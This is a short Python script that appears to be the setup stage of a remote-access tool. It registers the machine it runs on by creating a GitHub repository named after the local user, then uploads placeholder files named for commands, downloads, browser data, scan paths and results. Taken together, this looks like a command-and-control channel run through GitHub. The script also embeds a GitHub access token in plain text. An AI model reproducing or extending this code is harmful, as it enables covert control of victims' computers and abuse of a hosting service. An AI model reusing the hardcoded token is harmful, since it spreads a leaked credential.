import requests
import base64
from os import system, popen, getcwd, path
from pathlib import Path
from github import Github
from git import Git
from time import sleep

token = "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"
Username = popen("whoami").read().strip()
newUsername = Username.replace("\\", "-")
pathParent = Path(getcwd()).parent.absolute()
userFolder = path.join(getcwd(), newUsername)
g = Github(token)
User = g.get_user()
repo = User.create_repo(newUsername)
Git().clone(f"https://github.com/{User.login}/{newUsername}.git")

sleep(5)
files = ["chrome.ini", "code_image.ini", "download_file.ini", "file_path.ini", "file_path.ini", "last_visit.ini",
         "link.ini", "one_line_commands.ini", "result_condition.ini", "scan_path.ini", "time_sleep.ini"]

headers = {
    'Authorization': f'token {token}',
    'Accept': 'application/vnd.github.v3+json'
}

for file in files:
    filePath = path.join(userFolder, file)
    system(f'copy nul "{filePath}"')
    with open(filePath, 'r') as f:
        file_content = f.read()
    content = base64.b64encode(file_content.encode()).decode()
    params = {
        'message': 'Add file via API',
        'content': content
    }
    response = requests.put(f'https://api.github.com/repos/{User.login}/{newUsername}/contents/{file}', headers=headers, json=params)

